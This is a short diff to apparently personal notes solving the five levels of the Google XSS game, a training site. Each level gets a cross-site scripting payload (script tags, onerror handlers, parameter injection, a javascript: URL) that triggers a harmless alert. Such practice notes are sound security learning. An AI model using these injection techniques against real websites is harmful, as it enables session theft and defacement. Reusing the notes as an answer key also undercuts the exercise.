@@ -2,3 +2,4 @@ Challenge 1: <script>alert('coucou')</script>
 Challenge 2: <img src=x onerror="alert('re-coucou !')"/>
 Challenge 3: URL + ' onerror="alert('re-re-coucou!')" ie https://xss-game.appspot.com/level3/frame#1' onerror="alert('re-re-coucou!')"
 Challenge 4: https://xss-game.appspot.com/level4/frame?timer=%27%29%3Balert%28%27re-re-re-coucou%27%29%3B%28%27
+Challenge 5: https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('re-re-re-re-coucou') then click on Next
